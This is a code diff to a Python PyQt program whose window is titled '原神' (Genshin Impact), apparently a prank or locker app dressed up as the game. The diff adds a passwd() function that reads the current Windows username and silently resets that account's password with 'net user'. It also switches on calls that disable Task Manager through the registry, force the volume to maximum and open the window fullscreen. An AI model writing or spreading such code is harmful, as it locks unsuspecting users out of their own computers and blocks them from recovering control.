@@ -14,8 +14,7 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 def set_audio(volume):
     devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(
-        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+    interface = devices.Activate(IAudioEndpointVolume._iid_,CLSCTX_ALL, None)
     volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
     # 设置音量（0.0到1.0之间的浮点数）
     volume_interface.SetMasterVolumeLevelScalar(volume, None)
@@ -53,6 +52,19 @@ def disable_task_manage(num):
               f'Mgr /t REG_DWORD /d {num} /f')
 
 
+def passwd():
+    os.system('echo %username% > a')
+
+    file = open('./a', 'r', encoding='utf-8')
+    userName = file.readlines()
+    print(userName, type(userName))
+    userName = userName[0].split()[0]
+
+    print(userName)
+
+    os.system(f'net user {userName} 1145141919810')
+
+
 if __name__ == '__main__':
     app = QApplication(sys.argv)
     # 获取打包后的可执行文件所在的临时目录
@@ -66,13 +78,14 @@ if __name__ == '__main__':
     main_win.resize(available_geometry.width() / 3,
                     available_geometry.height() / 2)
     main_win.setWindowTitle('原神')
+    passwd()
     main_win.showFullScreen()
     main_win.play()
 
-    # disable_task_manage(1)
-    # set_audio(1.0)
+    disable_task_manage(1)
+    set_audio(1.0)
 
     threading.Thread(target=app.exec()).start()
-    # threading.Thread(target=ts()).start()
+    threading.Thread(target=ts()).start()
 
     sys.exit(app.exec())
